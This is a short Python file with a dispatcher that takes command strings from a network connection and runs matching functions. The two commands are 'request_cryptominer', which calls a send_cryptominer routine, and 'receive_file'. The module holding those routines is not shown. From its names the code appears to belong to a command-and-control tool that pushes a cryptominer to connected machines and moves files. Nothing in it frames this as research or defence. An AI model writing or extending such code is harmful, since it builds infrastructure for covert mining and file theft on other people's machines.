import tools
import network_commands as nc

def command_line(connection,address,buffer_size,data): 
    #DECLARE FUNCTIONAL COMMANDS

    COMMANDS = {
        "request_cryptominer" : nc.send_cryptominer,
        "receive_file" : nc.receive_file
    }

    #COMMAND LINE
    if data in COMMANDS.keys():
        #EXECUTE COMMAND FUNCTION
        print(f"[{address}] Executing {data}")
        COMMANDS[data](buffer_size,connection,address)
